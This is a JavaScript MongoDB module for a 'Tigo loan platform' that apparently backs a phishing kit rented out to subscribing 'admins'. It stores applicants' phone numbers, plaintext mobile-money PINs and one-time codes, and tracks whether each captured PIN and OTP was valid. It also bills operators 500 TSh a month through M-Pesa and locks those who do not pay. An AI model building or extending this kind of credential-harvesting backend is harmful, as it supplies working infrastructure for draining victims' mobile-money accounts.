const { MongoClient } = require('mongodb');

let client;
let db;

const DB_NAME = 'tigo_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    SUBSCRIPTIONS: 'subscriptions'
};

async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;
        if (!MONGODB_URI) throw new Error('❌ MONGODB_URI is not set in environment variables');

        console.log('🔄 Connecting to MongoDB...');
        client = new MongoClient(MONGODB_URI);
        await client.connect();
        db = client.db(DB_NAME);
        console.log('✅ Connected to MongoDB successfully');
        await createIndexes();
        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

async function createIndexes() {
    try {
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ shortCode: 1 }, { unique: true, sparse: true });

        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ status: 1 });
        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ nextBillingDate: 1 });
        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ isLocked: 1 });

        // Payment requests indexes
        await db.collection('payment_requests').createIndex({ adminId: 1 });
        await db.collection('payment_requests').createIndex({ status: 1 });
        await db.collection('payment_requests').createIndex({ requestedAt: -1 });

        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;
        if (!adminId) throw new Error('Admin ID is required');
        if (!adminData.name) throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');
        if (!adminData.shortCode) throw new Error('Admin shortCode is required');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);

        const existingCode = await db.collection(COLLECTIONS.ADMINS).findOne({ shortCode: adminData.shortCode });
        if (existingCode) throw new Error(`Short code '${adminData.shortCode}' is already taken`);

        const adminDocument = {
            adminId,
            name: adminData.name,
            email: adminData.email,
            chatId: adminData.chatId,
            shortCode: adminData.shortCode,
            status: adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        
        // Create subscription for new admin
        await createSubscription(adminId);
        
        console.log(`✅ Admin saved: ${adminId} | shortCode: ${adminData.shortCode}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByShortCode(shortCode) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ shortCode: shortCode.toLowerCase() });
    } catch (error) {
        console.error('❌ Error getting admin by short code:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).find({ status: 'active' }).toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        return 0;
    }
}

// ==========================================
// SUBSCRIPTION OPERATIONS
// ==========================================

function getNextBillingDate(fromDate = new Date()) {
    const date = new Date(fromDate);
    const nextMonth = new Date(date.getFullYear(), date.getMonth() + 1, 5);
    nextMonth.setHours(0, 0, 0, 0);
    return nextMonth;
}

async function createSubscription(adminId) {
    try {
        const existing = await db.collection(COLLECTIONS.SUBSCRIPTIONS).findOne({ adminId });
        if (existing) return existing;

        const today = new Date();
        const nextBillingDate = getNextBillingDate(today);

        const subscription = {
            adminId,
            status: 'active',
            subscriptionFee: 500,
            currency: 'TSh',
            paidUpTo: new Date().toISOString(),
            nextBillingDate: nextBillingDate.toISOString(),
            isLocked: false,
            lockReason: null,
            paymentHistory: [],
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        const result = await db.collection(COLLECTIONS.SUBSCRIPTIONS).insertOne(subscription);
        console.log(`💳 Subscription created for ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error creating subscription:', error);
        throw error;
    }
}

async function getSubscription(adminId) {
    try {
        return await db.collection(COLLECTIONS.SUBSCRIPTIONS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting subscription:', error);
        return null;
    }
}

async function updateSubscription(adminId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.SUBSCRIPTIONS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        return result;
    } catch (error) {
        console.error('❌ Error updating subscription:', error);
        throw error;
    }
}

async function recordPaymentRequest(adminId, mpesaDetails) {
    try {
        let subscription = await getSubscription(adminId);
        if (!subscription) {
            await createSubscription(adminId);
            subscription = await getSubscription(adminId);
        }

        const today = new Date();
        const dayOfMonth = today.getDate();
        const isEarlyPayment = dayOfMonth < 5;

        const paymentRecord = {
            adminId,
            mpesaReference: mpesaDetails.reference,
            amount: mpesaDetails.amount || 500,
            phoneNumber: mpesaDetails.phoneNumber,
            status: 'pending',
            isEarlyPayment,
            paymentDate: today.toISOString(),
            requestedAt: new Date().toISOString(),
            approvedAt: null,
            daysBeforeBilling: 5 - dayOfMonth
        };

        const result = await db.collection('payment_requests').insertOne(paymentRecord);
        console.log(`💰 Payment recorded for ${adminId} (Early: ${isEarlyPayment})`);
        return result;
    } catch (error) {
        console.error('❌ Error recording payment:', error);
        throw error;
    }
}

async function getPendingPayments() {
    try {
        return await db.collection('payment_requests')
            .find({ status: 'pending' })
            .sort({ requestedAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending payments:', error);
        return [];
    }
}

async function approvePayment(paymentId, adminId) {
    try {
        const payment = await db.collection('payment_requests').findOne({ _id: paymentId });
        if (!payment) throw new Error('Payment not found');

        await db.collection('payment_requests').updateOne(
            { _id: paymentId },
            { $set: { 
                status: 'approved', 
                approvedAt: new Date().toISOString() 
            } }
        );

        const nextBillingDate = getNextBillingDate(new Date());

        const subscription = await getSubscription(adminId);
        if (subscription) {
            const paymentHistory = subscription.paymentHistory || [];
            paymentHistory.push({
                reference: payment.mpesaReference,
                amount: payment.amount,
                approvedAt: new Date().toISOString(),
                isEarlyPayment: payment.isEarlyPayment,
                nextBillingDate: nextBillingDate.toISOString()
            });

            await updateSubscription(adminId, {
                status: 'active',
                paidUpTo: new Date().toISOString(),
                nextBillingDate: nextBillingDate.toISOString(),
                isLocked: false,
                lockReason: null,
                paymentHistory,
                lastPaymentApprovedAt: new Date().toISOString()
            });
        }

        console.log(`✅ Payment approved for ${adminId}, next billing: ${nextBillingDate.toDateString()}`);
        return true;
    } catch (error) {
        console.error('❌ Error approving payment:', error);
        return false;
    }
}

async function rejectPayment(paymentId) {
    try {
        await db.collection('payment_requests').updateOne(
            { _id: paymentId },
            { $set: { status: 'rejected', approvedAt: new Date().toISOString() } }
        );
        console.log(`❌ Payment rejected`);
        return true;
    } catch (error) {
        console.error('❌ Error rejecting payment:', error);
        return false;
    }
}

async function lockAdminSubscription(adminId, reason = 'Subscription fee overdue') {
    try {
        const today = new Date();
        
        await updateSubscription(adminId, {
            status: 'locked',
            isLocked: true,
            lockReason: reason,
            lockedAt: new Date().toISOString(),
            lockedOnDate: today.getDate()
        });
        console.log(`🔒 Admin ${adminId} locked: ${reason}`);
        return true;
    } catch (error) {
        console.error('❌ Error locking subscription:', error);
        return false;
    }
}

async function unlockAdminSubscription(adminId) {
    try {
        await updateSubscription(adminId, {
            isLocked: false,
            lockReason: null,
            unlockedAt: new Date().toISOString()
        });
        console.log(`🔓 Admin ${adminId} unlocked`);
        return true;
    } catch (error) {
        console.error('❌ Error unlocking subscription:', error);
        return false;
    }
}

async function checkAndLockOverdueSubscriptions() {
    try {
        const today = new Date();
        const dayOfMonth = today.getDate();
        
        if (dayOfMonth !== 5) {
            console.log(`📅 Today is the ${dayOfMonth}th - no locking needed`);
            return 0;
        }

        console.log(`📅 Today is the 5th - checking subscriptions...`);

        const subscriptions = await db.collection(COLLECTIONS.SUBSCRIPTIONS)
            .find({ isLocked: false })
            .toArray();

        let lockedCount = 0;
        
        for (const sub of subscriptions) {
            const approvedPayment = await db.collection('payment_requests').findOne({
                adminId: sub.adminId,
                status: 'approved'
            });

            if (!approvedPayment) {
                await lockAdminSubscription(sub.adminId, 'Subscription fee not paid - locked on the 5th');
                lockedCount++;
                console.log(`   🔒 Locked: ${sub.adminId}`);
            } else {
                console.log(`   ✅ Paid: ${sub.adminId}`);
            }
        }

        if (lockedCount > 0) {
            console.log(`🔒 Auto-locked ${lockedCount} overdue subscription(s)`);
        } else {
            console.log(`✅ All admins have paid their subscriptions`);
        }

        return lockedCount;
    } catch (error) {
        console.error('❌ Error checking subscriptions:', error);
        return 0;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id: appData.id,
            adminId: appData.adminId,
            adminName: appData.adminName,
            phoneNumber: appData.phoneNumber,
            pin: appData.pin,
            pinStatus: appData.pinStatus || 'pending',
            otpStatus: appData.otpStatus || 'pending',
            otp: appData.otp || null,
            assignmentType: 'specific',
            isReturningUser: appData.isReturningUser || false,
            previousCount: appData.previousCount || 0,
            timestamp: appData.timestamp || new Date().toISOString()
        });
        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).find({ adminId }).sort({ timestamp: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).find({
            adminId,
            $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
        }).sort({ timestamp: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS
// ==========================================

async function getAdminStats(adminId) {
    try {
        const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
        return { total, pinPending, pinApproved, otpPending, fullyApproved };
    } catch (error) {
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [{ pinStatus: 'rejected' }, { otpStatus: 'wrongpin_otp' }, { otpStatus: 'wrongcode' }]
        });
        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
    } catch (error) {
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        return await Promise.all(admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, ...stats };
        }));
    } catch (error) {
        return [];
    }
}

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
        admins.forEach(a => console.log(`   ${a.adminId}: ${a.name} | code: ${a.shortCode} | chat: ${a.chatId} | status: ${a.status}`));
        return admins;
    } catch (error) {
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } }, { adminId: null }, { adminId: '' },
                { chatId: { $exists: false } }, { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,
    saveAdmin,
    getAdmin,
    getAdminByShortCode,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,
    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,
    getAdminStats,
    getStats,
    getPerAdminStats,
    getAllAdminsDetailed,
    cleanupInvalidAdmins,
    createSubscription,
    getSubscription,
    updateSubscription,
    recordPaymentRequest,
    getPendingPayments,
    approvePayment,
    rejectPayment,
    lockAdminSubscription,
    unlockAdminSubscription,
    checkAndLockOverdueSubscriptions,
    getNextBillingDate
};
